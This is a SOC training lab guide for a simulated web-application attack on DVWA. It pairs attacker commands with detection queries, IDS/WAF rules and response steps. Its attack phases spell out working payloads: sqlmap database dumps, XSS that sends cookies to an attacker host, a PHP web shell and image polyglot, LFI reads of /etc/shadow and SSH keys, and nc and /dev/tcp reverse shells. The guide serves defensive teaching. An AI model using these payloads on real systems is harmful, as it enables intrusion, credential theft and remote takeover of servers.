# Attack Scenario 3: Web Application Attack Campaign

## Scenario Overview
This scenario simulates a comprehensive web application attack campaign including reconnaissance, vulnerability exploitation, privilege escalation, and data extraction. SOC analysts will practice detecting and analyzing web-based attacks using DVWA and custom vulnerable applications.

## Learning Objectives
- Detect web application attacks in HTTP logs
- Analyze SQL injection and XSS attack patterns
- Identify file upload and directory traversal attacks
- Monitor web application security events
- Implement web application firewall rules

## Attack Timeline
**Duration**: 3-4 hours  
**Difficulty**: Intermediate  
**Prerequisites**: Understanding of HTTP protocol, web technologies, and common web vulnerabilities

## Lab Setup

### Target Systems
- **Ubuntu Vulnerable VM** (10.0.2.101) - DVWA and custom web applications
- **Windows 10 Vulnerable VM** (10.0.2.102) - IIS with vulnerable applications

### Monitoring Systems
- **ELK SIEM** (10.0.2.100) - Web log analysis and alerting
- **Suricata IDS** - HTTP traffic inspection

### Web Applications
- **DVWA** - Damn Vulnerable Web Application
- **WebGoat** - OWASP WebGoat
- **Custom PHP application** - Additional vulnerable endpoints

## Attack Execution

### Phase 1: Reconnaissance and Enumeration (45 minutes)

#### Attacker Actions (Kali Linux)
```bash
# Web service discovery
nmap -sS -sV -p 80,443,8080,8443 10.0.2.0/24

# Directory enumeration
gobuster dir -u http://10.0.2.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js

# Technology fingerprinting
whatweb http://10.0.2.101
nikto -h http://10.0.2.101

# Subdomain enumeration (if applicable)
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.10.0.2.101 -mc 200

# Web application scanning
nuclei -u http://10.0.2.101 -t /root/nuclei-templates/
```

#### Expected Logs Generated
```bash
# Apache access logs
10.0.2.15 - - [06/Dec/2023:12:00:15 +0000] "GET / HTTP/1.1" 200 1234 "-" "gobuster/3.1.0"
10.0.2.15 - - [06/Dec/2023:12:00:16 +0000] "GET /admin HTTP/1.1" 404 567 "-" "gobuster/3.1.0"
10.0.2.15 - - [06/Dec/2023:12:00:17 +0000] "GET /login.php HTTP/1.1" 200 890 "-" "gobuster/3.1.0"
10.0.2.15 - - [06/Dec/2023:12:00:18 +0000] "GET /dvwa HTTP/1.1" 200 1567 "-" "gobuster/3.1.0"

# Suricata alerts
[**] [1:2013028:8] ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management [**]
[Classification: Potentially Bad Traffic] [Priority: 2]
12/06-12:00:20.123456 10.0.2.15:45678 -> 10.0.2.101:80
```

### Phase 2: SQL Injection Attacks (60 minutes)

#### DVWA SQL Injection
```bash
# Manual SQL injection testing
curl "http://10.0.2.101/dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit" \
  -H "Cookie: PHPSESSID=abc123; security=low"

# Automated SQL injection with SQLMap
sqlmap -u "http://10.0.2.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low" \
  --dbs --batch --risk=3 --level=5

# Database enumeration
sqlmap -u "http://10.0.2.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low" \
  -D dvwa --tables

# Data extraction
sqlmap -u "http://10.0.2.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low" \
  -D dvwa -T users --dump
```

#### Blind SQL Injection
```bash
# Time-based blind SQL injection
curl "http://10.0.2.101/dvwa/vulnerabilities/sqli_blind/?id=1' AND (SELECT SLEEP(5))--&Submit=Submit" \
  -H "Cookie: PHPSESSID=abc123; security=low" \
  -w "%{time_total}"

# Boolean-based blind SQL injection
curl "http://10.0.2.101/dvwa/vulnerabilities/sqli_blind/?id=1' AND (SELECT SUBSTRING(user(),1,1)='r')--&Submit=Submit" \
  -H "Cookie: PHPSESSID=abc123; security=low"
```

#### Expected Logs Generated
```bash
# Apache access logs with SQL injection attempts
10.0.2.15 - - [06/Dec/2023:12:15:30 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27=%271&Submit=Submit HTTP/1.1" 200 2345 "-" "curl/7.68.0"
10.0.2.15 - - [06/Dec/2023:12:15:31 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%201,2,3,4,5--&Submit=Submit HTTP/1.1" 200 2678 "-" "sqlmap/1.6.12"

# PHP error logs (if enabled)
[06-Dec-2023 12:15:30 UTC] PHP Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /var/www/html/dvwa/vulnerabilities/sqli/source/low.php on line 15
```

### Phase 3: Cross-Site Scripting (XSS) Attacks (45 minutes)

#### Reflected XSS
```bash
# Basic XSS payload
curl "http://10.0.2.101/dvwa/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>" \
  -H "Cookie: PHPSESSID=abc123; security=low"

# Advanced XSS payload
curl "http://10.0.2.101/dvwa/vulnerabilities/xss_r/?name=<img src=x onerror=fetch('http://10.0.2.15:8080/steal?cookie='+document.cookie)>" \
  -H "Cookie: PHPSESSID=abc123; security=low"

# XSS with JavaScript execution
curl "http://10.0.2.101/dvwa/vulnerabilities/xss_r/?name=<script>document.location='http://10.0.2.15:8080/steal?cookie='+document.cookie</script>" \
  -H "Cookie: PHPSESSID=abc123; security=low"
```

#### Stored XSS
```bash
# Store malicious script in database
curl -X POST "http://10.0.2.101/dvwa/vulnerabilities/xss_s/" \
  -H "Cookie: PHPSESSID=abc123; security=low" \
  -d "txtName=<script>fetch('http://10.0.2.15:8080/steal?cookie='+document.cookie)</script>&mtxMessage=Test&btnSign=Sign+Guestbook"
```

#### DOM-based XSS
```bash
# DOM XSS exploitation
curl "http://10.0.2.101/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>" \
  -H "Cookie: PHPSESSID=abc123; security=low"
```

### Phase 4: File Upload Attacks (30 minutes)

#### Malicious File Upload
```bash
# Create PHP web shell
cat > /tmp/shell.php << 'EOF'
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
<form method="GET">
<input type="text" name="cmd" placeholder="Enter command">
<input type="submit" value="Execute">
</form>
EOF

# Upload web shell
curl -X POST "http://10.0.2.101/dvwa/vulnerabilities/upload/" \
  -H "Cookie: PHPSESSID=abc123; security=low" \
  -F "uploaded=@/tmp/shell.php" \
  -F "Upload=Upload"

# Execute commands via web shell
curl "http://10.0.2.101/dvwa/hackable/uploads/shell.php?cmd=whoami" \
  -H "Cookie: PHPSESSID=abc123; security=low"

curl "http://10.0.2.101/dvwa/hackable/uploads/shell.php?cmd=cat /etc/passwd" \
  -H "Cookie: PHPSESSID=abc123; security=low"
```

#### Image File with Embedded PHP
```bash
# Create malicious image file
echo -e '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xFF\xDB\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0C\x14\r\x0C\x0B\x0B\x0C\x19\x12\x13\x0F\x14\x1D\x1A\x1F\x1E\x1D\x1A\x1C\x1C $.\x27 ",#\x1C\x1C(7),01444\x1F\'9=82<.342\xFF\xC0\x00\x11\x08\x00\x01\x00\x01\x01\x01\x11\x00\x02\x11\x01\x03\x11\x01\xFF\xC4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xC4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xDA\x00\x0C\x03\x01\x00\x02\x11\x03\x11\x00\x3F\x00\xAA\xFF\xD9<?php system($_GET["cmd"]); ?>' > /tmp/malicious.jpg

# Upload malicious image
curl -X POST "http://10.0.2.101/dvwa/vulnerabilities/upload/" \
  -H "Cookie: PHPSESSID=abc123; security=low" \
  -F "uploaded=@/tmp/malicious.jpg" \
  -F "Upload=Upload"
```

### Phase 5: Directory Traversal and LFI (30 minutes)

#### Local File Inclusion
```bash
# Basic LFI
curl "http://10.0.2.101/dvwa/vulnerabilities/fi/?page=../../../etc/passwd" \
  -H "Cookie: PHPSESSID=abc123; security=low"

# LFI with null byte (PHP < 5.3)
curl "http://10.0.2.101/dvwa/vulnerabilities/fi/?page=../../../etc/passwd%00" \
  -H "Cookie: PHPSESSID=abc123; security=low"

# LFI to access log files
curl "http://10.0.2.101/dvwa/vulnerabilities/fi/?page=../../../var/log/apache2/access.log" \
  -H "Cookie: PHPSESSID=abc123; security=low"

# Log poisoning via User-Agent
curl "http://10.0.2.101/" \
  -H "User-Agent: <?php system(\$_GET['cmd']); ?>" \
  -H "Cookie: PHPSESSID=abc123; security=low"

# Execute commands via log poisoning
curl "http://10.0.2.101/dvwa/vulnerabilities/fi/?page=../../../var/log/apache2/access.log&cmd=whoami" \
  -H "Cookie: PHPSESSID=abc123; security=low"
```

#### Directory Traversal
```bash
# Access sensitive files
curl "http://10.0.2.101/dvwa/vulnerabilities/fi/?page=../../../../etc/shadow" \
  -H "Cookie: PHPSESSID=abc123; security=low"

curl "http://10.0.2.101/dvwa/vulnerabilities/fi/?page=../../../../home/vulnerable/.ssh/id_rsa" \
  -H "Cookie: PHPSESSID=abc123; security=low"
```

### Phase 6: Command Injection (30 minutes)

#### OS Command Injection
```bash
# Basic command injection
curl "http://10.0.2.101/dvwa/vulnerabilities/exec/?ip=127.0.0.1;whoami&Submit=Submit" \
  -H "Cookie: PHPSESSID=abc123; security=low"

# Command injection with output redirection
curl "http://10.0.2.101/dvwa/vulnerabilities/exec/?ip=127.0.0.1;cat /etc/passwd&Submit=Submit" \
  -H "Cookie: PHPSESSID=abc123; security=low"

# Reverse shell via command injection
curl "http://10.0.2.101/dvwa/vulnerabilities/exec/?ip=127.0.0.1;nc -e /bin/bash 10.0.2.15 4444&Submit=Submit" \
  -H "Cookie: PHPSESSID=abc123; security=low"

# Alternative reverse shell
curl "http://10.0.2.101/dvwa/vulnerabilities/exec/?ip=127.0.0.1;bash -i >& /dev/tcp/10.0.2.15/4444 0>&1&Submit=Submit" \
  -H "Cookie: PHPSESSID=abc123; security=low"
```

## SOC Analysis Tasks

### Task 1: Web Attack Detection (60 minutes)

#### SQL Injection Detection
```bash
# Kibana queries for SQL injection
http.request.body.content:*UNION* OR http.request.body.content:*SELECT* OR uri:*UNION* OR uri:*SELECT*

# Common SQL injection patterns
uri:*%27* OR uri:*%22* OR uri:*OR%201=1* OR uri:*UNION%20SELECT*

# Time-based SQL injection detection
response_time:>5000 AND (uri:*SLEEP* OR uri:*WAITFOR* OR uri:*BENCHMARK*)
```

#### XSS Attack Detection
```bash
# XSS payload detection
uri:*<script* OR uri:*javascript:* OR uri:*onerror* OR uri:*onload*

# Encoded XSS detection
uri:*%3Cscript* OR uri:*%3C%2Fscript* OR uri:*&lt;script*

# XSS in POST data
http.request.body.content:*<script* OR http.request.body.content:*javascript:*
```

#### File Upload Attack Detection
```bash
# Suspicious file uploads
http.request.body.content:*Content-Type:* AND (uri:*.php* OR uri:*.jsp* OR uri:*.asp*)

# Web shell detection
http.request.body.content:*system* OR http.request.body.content:*exec* OR http.request.body.content:*shell_exec*

# File upload to unusual directories
uri:*/uploads/* AND method:"POST"
```

### Task 2: Attack Pattern Analysis (45 minutes)

#### User-Agent Analysis
```bash
# Automated tool detection
user_agent:"sqlmap" OR user_agent:"gobuster" OR user_agent:"nikto" OR user_agent:"nuclei"

# Suspicious user agents
user_agent:*python* OR user_agent:*curl* OR user_agent:*wget*
```

#### Request Frequency Analysis
```bash
# High-frequency requests from single IP
source.ip:"10.0.2.15" | stats count by uri | where count > 100

# Rapid-fire requests (potential automated attack)
@timestamp:[now-1m TO now] AND source.ip:"10.0.2.15" | stats count
```

#### Parameter Tampering Detection
```bash
# Unusual parameter values
uri:*%00* OR uri:*../* OR uri:*%2e%2e%2f*

# Long parameter values (potential buffer overflow)
uri.length:>1000

# Special characters in parameters
uri:*%3C* OR uri:*%3E* OR uri:*%27* OR uri:*%22*
```

### Task 3: Impact Assessment (30 minutes)

#### Successful Attack Indicators
```bash
# HTTP 200 responses to attack payloads
response:200 AND (uri:*UNION* OR uri:*<script* OR uri:*../../../*)

# Large response sizes (data extraction)
bytes:>10000 AND (uri:*UNION* OR uri:*SELECT*)

# Error messages revealing information
response_body:*mysql* OR response_body:*Warning:* OR response_body:*Fatal error:*
```

#### Data Exfiltration Detection
```bash
# Large outbound HTTP responses
bytes:>100000 AND source.ip:"10.0.2.101"

# Suspicious outbound connections from web server
source.ip:"10.0.2.101" AND destination.port:4444
```

### Task 4: Timeline Construction (45 minutes)

#### Attack Progression Analysis
```bash
# Phase 1: Reconnaissance
@timestamp:[2023-12-06T12:00:00 TO 2023-12-06T12:45:00] AND user_agent:"gobuster"

# Phase 2: Exploitation
@timestamp:[2023-12-06T12:45:00 TO 2023-12-06T14:00:00] AND (uri:*UNION* OR uri:*<script*)

# Phase 3: Post-exploitation
@timestamp:[2023-12-06T14:00:00 TO 2023-12-06T15:00:00] AND (uri:*shell.php* OR uri:*cmd=*)
```

## Detection Rules

### Suricata Rules
```bash
# SQL injection detection
alert http any any -> $HOME_NET any (msg:"SQL Injection Attempt"; flow:to_server,established; content:"UNION"; http_uri; nocase; pcre:"/union.+select/i"; sid:1000030; rev:1;)

# XSS detection
alert http any any -> $HOME_NET any (msg:"XSS Attempt"; flow:to_server,established; content:"<script"; http_uri; nocase; sid:1000031; rev:1;)

# Command injection detection
alert http any any -> $HOME_NET any (msg:"Command Injection Attempt"; flow:to_server,established; pcre:"/(\||;|&|`|\$\()/"; http_uri; sid:1000032; rev:1;)

# File upload attack
alert http any any -> $HOME_NET any (msg:"Malicious File Upload"; flow:to_server,established; content:"Content-Type|3a 20|application/octet-stream"; http_header; content:"<?php"; http_client_body; sid:1000033; rev:1;)

# Directory traversal
alert http any any -> $HOME_NET any (msg:"Directory Traversal Attempt"; flow:to_server,established; content:"../"; http_uri; threshold:type both,track by_src,count 3,seconds 60; sid:1000034; rev:1;)
```

### ModSecurity Rules
```apache
# SQL injection protection
SecRule ARGS "@detectSQLi" \
    "id:1001,\
    phase:2,\
    block,\
    msg:'SQL Injection Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\
    severity:'CRITICAL',\
    tag:'application-multi',\
    tag:'language-multi',\
    tag:'platform-multi',\
    tag:'attack-sqli'"

# XSS protection
SecRule ARGS "@detectXSS" \
    "id:1002,\
    phase:2,\
    block,\
    msg:'XSS Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\
    severity:'CRITICAL',\
    tag:'application-multi',\
    tag:'language-multi',\
    tag:'platform-multi',\
    tag:'attack-xss'"
```

### ELK Detection Rules
```json
{
  "query": {
    "bool": {
      "should": [
        {
          "wildcard": {
            "uri": "*UNION*SELECT*"
          }
        },
        {
          "wildcard": {
            "uri": "*<script*"
          }
        },
        {
          "wildcard": {
            "uri": "*../../../*"
          }
        }
      ],
      "minimum_should_match": 1
    }
  }
}
```

## Response Procedures

### Immediate Response (15 minutes)

1. **Block Attacker IP**
   ```bash
   # Apache/Nginx level blocking
   echo "deny 10.0.2.15;" >> /etc/nginx/conf.d/blocked_ips.conf
   nginx -s reload
   
   # Iptables blocking
   iptables -A INPUT -s 10.0.2.15 -j DROP
   ```

2. **Disable Vulnerable Applications**
   ```bash
   # Temporarily disable DVWA
   mv /var/www/html/dvwa /var/www/html/dvwa.disabled
   
   # Restart web server
   systemctl restart apache2
   ```

3. **Enable Enhanced Logging**
   ```apache
   # Apache configuration
   LogLevel info
   CustomLog /var/log/apache2/security.log combined
   ```

### Investigation Phase (60 minutes)

1. **Log Analysis**
   ```bash
   # Extract attack-related logs
   grep "10.0.2.15" /var/log/apache2/access.log > /tmp/attack_logs.txt
   
   # Analyze attack patterns
   cat /tmp/attack_logs.txt | grep -E "(UNION|SELECT|<script|\.\.\/)" | wc -l
   ```

2. **Database Integrity Check**
   ```sql
   -- Check for unauthorized database changes
   SELECT * FROM information_schema.tables WHERE table_schema = 'dvwa';
   SELECT * FROM dvwa.users;
   
   -- Check for new administrative users
   SELECT * FROM dvwa.users WHERE admin = 1;
   ```

3. **File System Analysis**
   ```bash
   # Check for uploaded malicious files
   find /var/www/html -name "*.php" -newer /tmp/attack_start_time
   
   # Analyze uploaded files
   file /var/www/html/dvwa/hackable/uploads/*
   strings /var/www/html/dvwa/hackable/uploads/shell.php
   ```

### Remediation Phase (45 minutes)

1. **Remove Malicious Files**
   ```bash
   # Remove uploaded web shells
   rm -f /var/www/html/dvwa/hackable/uploads/shell.php
   rm -f /var/www/html/dvwa/hackable/uploads/malicious.jpg
   ```

2. **Database Cleanup**
   ```sql
   -- Remove malicious XSS payloads
   DELETE FROM dvwa.guestbook WHERE message LIKE '%<script%';
   
   -- Reset compromised user accounts
   UPDATE dvwa.users SET password = MD5('newpassword') WHERE username = 'admin';
   ```

3. **Application Hardening**
   ```php
   // Implement input validation
   function sanitize_input($input) {
       return htmlspecialchars(strip_tags(trim($input)));
   }
   
   // Use prepared statements
   $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
   $stmt->execute([$user_id]);
   ```

## Expected Findings

### Attack Characteristics
- **Reconnaissance**: Directory enumeration, technology fingerprinting
- **SQL Injection**: Union-based and blind injection techniques
- **XSS**: Reflected, stored, and DOM-based attacks
- **File Upload**: Web shell upload and execution
- **Directory Traversal**: Access to sensitive system files
- **Command Injection**: OS command execution via web interface

### Detection Metrics
- **Total Requests**: 1000+ malicious requests
- **Attack Duration**: 2-3 hours
- **Success Rate**: Variable based on application security level
- **Data Accessed**: User credentials, system files, application data

## Lab Variations

### Advanced Scenarios
1. **WAF Evasion**: Techniques to bypass web application firewalls
2. **Blind Attacks**: Time-based and boolean-based blind exploitation
3. **Second-Order Attacks**: Stored payloads executed in different contexts
4. **Client-Side Attacks**: CSRF, clickjacking, and DOM manipulation

### Different Applications
1. **WordPress**: Common CMS vulnerabilities
2. **Custom Applications**: Business logic flaws
3. **API Endpoints**: REST/GraphQL API attacks
4. **WebSockets**: Real-time communication attacks

## Assessment Criteria

### Beginner Level (Pass)
- [ ] Detect basic web attacks in logs
- [ ] Identify common attack patterns
- [ ] Implement IP blocking
- [ ] Generate basic incident report

### Intermediate Level (Good)
- [ ] Analyze complex attack chains
- [ ] Create custom detection rules
- [ ] Perform impact assessment
- [ ] Implement application-level mitigations

### Advanced Level (Excellent)
- [ ] Develop behavioral analysis techniques
- [ ] Create automated response procedures
- [ ] Perform threat hunting activities
- [ ] Design comprehensive security architecture

## Additional Resources

### Web Application Security
- OWASP Top 10
- Web Application Hacker's Handbook
- PortSwigger Web Security Academy
- SANS SEC542 course materials

### Detection and Response
- ModSecurity rule writing
- Suricata HTTP inspection
- ELK web log analysis
- Incident response playbooks